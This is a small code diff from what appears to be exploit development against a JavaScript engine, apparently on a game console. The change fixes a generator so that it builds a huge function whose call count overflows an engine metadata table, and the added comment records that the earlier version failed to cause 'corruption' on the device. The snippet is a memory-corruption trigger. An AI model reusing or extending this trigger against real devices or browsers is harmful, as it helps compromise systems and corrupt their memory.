@@ -198,7 +198,13 @@
     var CHUNK = 4000000;
     var units = MODE === 'pair' ? [ 'a();', 'b();' ] : [ 'a();' ];
     var perChunkCalls = Math.floor(CHUNK / units.length);
-    var chunkText = units.join('');
+    // Each chunk must carry perChunkCalls repetitions of the unit text. The
+    // committed version pushed units.join('') once per chunk (8 bytes), so the
+    // generated function held ~2.35M op_calls and the metadata table never
+    // wrapped — caught on device (third console): BLOB-9MB instead of ~146MB,
+    // SURVIVED, and the worker polled forever with zero corruption.
+    var chunkText = '';
+    for (var u = 0; u < perChunkCalls; u++) chunkText += units.join('');
 
     var parts = ['window.__v161fn=function(a,b){'];
     var chunks = Math.floor(N_OVERFLOW / (perChunkCalls * units.length) );
